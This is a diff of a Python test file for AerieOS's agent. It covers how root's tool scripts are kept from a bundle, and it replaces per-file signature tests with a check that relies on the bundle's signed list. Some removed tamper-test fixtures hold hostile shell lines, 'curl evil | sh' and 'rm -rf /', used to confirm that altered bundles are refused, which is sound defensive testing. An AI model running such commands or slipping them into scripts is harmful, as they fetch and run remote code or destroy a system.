@@ -1,12 +1,12 @@
 """The tools root installs from the bundle are AerieOS's release where the
-node pinned the release key (R227 step 1, the rest of it), and a machine's
-console can switch off every root command the controller sends (step 2).
+node pinned the release key (R227 step 1, held by the bundle's signed list
+since R267 step 28), and a machine's console can switch off every root
+command the controller sends (step 2).
 
 The bundle's digest is the controller's word and moves with a person's tool
-packs, so what a release signs is the list of root's files in it. A pinned
-node keeps root's copy only under that signature, keeps the copy it has
-otherwise, takes unsigned ones only where its console said so, and a node
-that pinned nothing goes on as before."""
+packs, so what a release signs is the list of the files it ships in it,
+root's among them. Root keeps its copy only from a tar that list passed;
+a second signature over root's files alone said nothing more, and is gone."""
 import io
 import json
 import os
@@ -19,48 +19,18 @@ from unittest import mock
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, os.path.join(HERE, "..", "..", "agent"))
 sys.path.insert(0, os.path.join(HERE, ".."))
-from aerieos_agent import base, cli, configplane, release, stores, workspace  # noqa: E402
-from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402
+from aerieos_agent import cli, configplane, stores, workspace  # noqa: E402
 
 FILES = {"nodes/provision-linux.sh": b"#!/bin/sh\necho provision\n", "nodes/bb-session": b"#!/bin/sh\necho session\n",
          "nodes/bb-netcut": b"#!/bin/sh\necho netcut\n", "nodes/families/debian.sh": b"family=debian\n"}
 
 
-def pair():
-    k = Ed25519PrivateKey.generate()
-    return k, k.public_key().public_bytes_raw().hex()
-
-
-def bundle_tar(path, files, sig=None, extra=None):
+def bundle_tar(path, files, extra=None):
     with tarfile.open(path, "w") as tar:
-        held = dict(files, **(extra or {}))
-        if sig is not None:
-            held[base.TOOLS_SIG] = json.dumps({"sig": sig}).encode()
-        for name, data in held.items():
+        for name, data in dict(files, **(extra or {})).items():
             ti = tarfile.TarInfo(name)
             ti.size = len(data)
             tar.addfile(ti, io.BytesIO(data))
-
-
-class Digest(unittest.TestCase):
-    def test_it_names_every_file_and_moves_with_any_of_them(self):
-        d = release.tools_digest(FILES)
-        self.assertRegex(d, r"^sha256:[0-9a-f]{64}$")
-        self.assertEqual(d, release.tools_digest(dict(reversed(list(FILES.items())))), "the order they were read in does not matter")
-        self.assertNotEqual(d, release.tools_digest({**FILES, "nodes/bb-session": b"#!/bin/sh\nid\n"}), "a changed file")
-        self.assertNotEqual(d, release.tools_digest({**FILES, "nodes/families/extra.sh": b""}), "an added file")
-        moved = {("nodes/bb-netcut" if k == "nodes/bb-session" else "nodes/bb-session" if k == "nodes/bb-netcut" else k): v
-                 for k, v in FILES.items()}
-        self.assertNotEqual(d, release.tools_digest(moved), "two files under each other's names")
-
-    def test_the_agents_signature_is_not_the_tools_and_the_other_way(self):
-        k, pub = pair()
-        d = release.tools_digest(FILES)
-        as_agent = k.sign(release.MESSAGE + d.encode()).hex()
-        as_tools = k.sign(release.TOOLS_MESSAGE + d.encode()).hex()
-        self.assertEqual(release.verify(pub, d, as_tools, release.TOOLS_MESSAGE), "")
-        self.assertIn("not the pinned", release.verify(pub, d, as_agent, release.TOOLS_MESSAGE))
-        self.assertIn("not the pinned", release.verify(pub, d, as_tools))
 
 
 class Keep(unittest.TestCase):
@@ -73,73 +43,39 @@ class Keep(unittest.TestCase):
         p = mock.patch.object(workspace, "TOOLS_DIR", self.tools)
         p.start()
         self.addCleanup(p.stop)
-        self.k, self.pub = pair()
 
-    def keep(self, name, trust):
-        return workspace.WorkspaceMixin._keep_root_tools(self.tar, name, self.said.append, trust)
+    def keep(self, name):
+        return workspace.WorkspaceMixin._keep_root_tools(self.tar, name, self.said.append)
 
     def current(self):
         link = os.path.join(self.tools, "current")
         return os.readlink(link) if os.path.islink(link) else ""
 
-    def sig(self, files=FILES, key=None):
-        return (key or self.k).sign(release.TOOLS_MESSAGE + release.tools_digest(files).encode()).hex()
-
-    def test_a_node_that_pinned_nothing_keeps_them_as_before(self):
-        bundle_tar(self.tar, FILES)
-        self.assertTrue(self.keep("aaaa", {}))
+    def test_roots_own_files_are_lifted_out_and_nothing_else(self):
+        bundle_tar(self.tar, FILES, extra={"scripts/aerie": b"not root's", "config/toolpacks.json": b"{}"})
+        self.assertTrue(self.keep("aaaa"))
         self.assertEqual(self.current(), "aaaa")
         with open(os.path.join(self.tools, "aaaa", "nodes", "bb-session"), "rb") as f:
             self.assertEqual(f.read(), FILES["nodes/bb-session"])
-        self.assertEqual(self.said, [], "and says nothing")
-
-    def test_a_pinned_node_keeps_what_the_release_signed(self):
-        bundle_tar(self.tar, FILES, self.sig(), extra={"scripts/aerie": b"not root's", "config/toolpacks.json": b"{}"})
-        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
-        self.assertEqual(self.current(), "aaaa")
-        self.assertIn("signed by the release key", self.said[0])
+        self.assertTrue(os.path.isfile(os.path.join(self.tools, "aaaa", "nodes", "families", "debian.sh")))
         self.assertFalse(os.path.exists(os.path.join(self.tools, "aaaa", "scripts")), "only root's own files are lifted out")
-        self.said.clear()
-        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
-        self.assertEqual(self.said, [], "the same bundle again is neither checked nor said again")
+        self.assertEqual(self.said, [])
+        self.assertTrue(self.keep("aaaa"), "the same bundle again: nothing to do")
+        bundle_tar(self.tar, {**FILES, "nodes/bb-session": b"#!/bin/sh\necho newer\n"})
+        self.assertTrue(self.keep("bbbb"))
+        self.assertEqual(self.current(), "bbbb")
+        self.assertFalse(os.path.exists(os.path.join(self.tools, "aaaa")), "the copy of another bundle goes")
 
-    def test_a_person_s_packs_move_the_bundle_and_not_the_signature(self):
-        # The reason the list is signed and not the bundle's own digest.
-        bundle_tar(self.tar, FILES, self.sig(), extra={"config/toolpacks.json": b'{"packs": ["mine"]}', "packs/mine/tool": b"x"})
-        self.assertTrue(self.keep("bbbb", {"release_key": self.pub}))
-
-    def test_a_pinned_node_keeps_the_copy_it_has_when_a_file_was_changed(self):
-        bundle_tar(self.tar, FILES, self.sig())
-        self.assertTrue(self.keep("aaaa", {"release_key": self.pub}))
-        tampered = {**FILES, "nodes/bb-session": b"#!/bin/sh\ncurl evil | sh\n"}
-        bundle_tar(self.tar, tampered, self.sig())          # the release's signature, another file under it
-        self.said.clear()
-        self.assertFalse(self.keep("cccc", {"release_key": self.pub}))
-        self.assertEqual(self.current(), "aaaa", "root goes on with the copy it has")
-        self.assertFalse(os.path.exists(os.path.join(self.tools, "cccc")), "nothing of the refused one is written")
-        self.assertIn("root keeps the copy it has", self.said[0])
-        self.assertRegex(self.said[0], r"sudo (aerieos|builderbot)-agent unsigned on")
-
-    def test_unsigned_or_signed_by_another_is_refused_unless_the_console_allows(self):
-        other, _ = pair()
-        for sig in (None, "", self.sig(key=other)):
-            bundle_tar(self.tar, FILES, sig)
-            self.assertFalse(self.keep("dddd", {"release_key": self.pub}), sig)
-        self.assertEqual(self.current(), "")
-        self.said.clear()
-        bundle_tar(self.tar, FILES)
-        self.assertTrue(self.keep("dddd", {"release_key": self.pub, "unsigned_ok": True}))
-        self.assertIn("console allows unsigned", self.said[0])
-
-    def test_the_spare_s_signature_is_taken(self):
-        s, spare = pair()
-        bundle_tar(self.tar, FILES, self.sig(key=s))
-        self.assertTrue(self.keep("eeee", {"release_key": self.pub, "release_spare": spare}))
-        self.assertIn("spare release key", self.said[0])
-
-    def test_an_added_family_file_is_not_slipped_under_the_signature(self):
-        bundle_tar(self.tar, {**FILES, "nodes/families/zz.sh": b"rm -rf /\n"}, self.sig())
-        self.assertFalse(self.keep("ffff", {"release_key": self.pub}))
+    def test_only_a_tar_the_bundles_signed_list_passed_is_kept_from(self):
+        # The keep is reached only past _bundle_checked (may_keep_bundle):
+        # a refused bundle returns before root's copy is touched.
+        with open(os.path.join(HERE, "..", "..", "agent", "aerieos_agent", "workspace.py"), encoding="utf-8") as f:
+            text = f.read()
+        checked = text.index("ok, said = self._bundle_checked(part, trust)")
+        refused = text.index("return before", checked)
+        kept = text.index("self._keep_root_tools(tar_path", checked)
+        self.assertLess(refused, kept)
+        self.assertNotIn("root-tools.sig", text)
 
 
 class RootAsks(unittest.TestCase):
